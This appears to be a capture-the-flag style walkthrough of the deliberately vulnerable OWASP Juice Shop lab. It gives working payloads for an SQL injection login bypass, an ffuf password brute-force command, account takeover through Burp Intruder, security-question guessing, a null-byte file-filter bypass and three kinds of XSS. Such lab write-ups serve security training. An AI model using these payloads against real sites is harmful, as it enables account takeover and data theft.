# Juicy Shop OWASP





Looking around we can take the admin email in this product's comment

<figure><img src="../../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

```
admin@juice-sh.op
```



## SQLi to bypass login

Intercept the Login request and try to change the parameters with a SQLi payload.

{% code title="Payload" %}
```
email: ' OR 1=1--
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

We can see that we bypassed the auth and now we are the admin of the shop.

Now we try to login as other users.

Take the user's email from post's comments.

```
bender@juice-sh.op
stan@juice-sh.op
uvogin@juice-sh.op
jim@juice-sh.op
mc.safesearch@juice-sh.op
accountant@juice-sh.op
bjoern@owasp.org
```

Paste these email in the burp Intruter and watch we can do.

<figure><img src="../../../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>

We can make access to all users account.



## Broken Auth&#x20;

### Brute Forcing

Try to guess some password using Password brute force.

{% code overflow="wrap" %}
```bash
ffuf -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt:W2 -X POST -d "email=admin@juice-sh.op&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.149.131/rest/user/login -fc 401
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>

```
admin@juice-sh.op : admin123
```



### Trivial reset password questions

<figure><img src="../../../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>

The question can exploits using OSINT and get personal data from browsing online.

For example Jim wrote a comment refers to Star Treck, this can think us that the Jim is the Star Treck's Jim. And searching online the brother of him is Samuel.

Using this answer above we can change jim's password.



## Sensitive Data Exposure

Navigating in the site we found this exposure directory

<figure><img src="../../../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>

But to bypass the filter that do not allow us to download files except .md and .pdf, we can use the NULL pointer %2500.

```
http://10.10.94.254/ftp/coupons_2013.md.bak%2500.md
```

&#x20;

## XSS vulnerabilities

DOM XSS

In search bar insert this payload (search bar change the DOM)

```
<iframe src="javascript:alert(`xss`)"> 
```

Stored XSS

Use function /saveLodonIP when a user click on Logout funcion and add this header to store the XSS payload in the "Last Logon IP" page.

```
True-Client-IP: <iframe src="javascript:alert(`xss`)">
```

Reflected

Go to Tracker page and use the id var to exploit XSS vulnerability

```
...id=<iframe src="javascript:alert(`xss`)">
```

Then refresh the page.
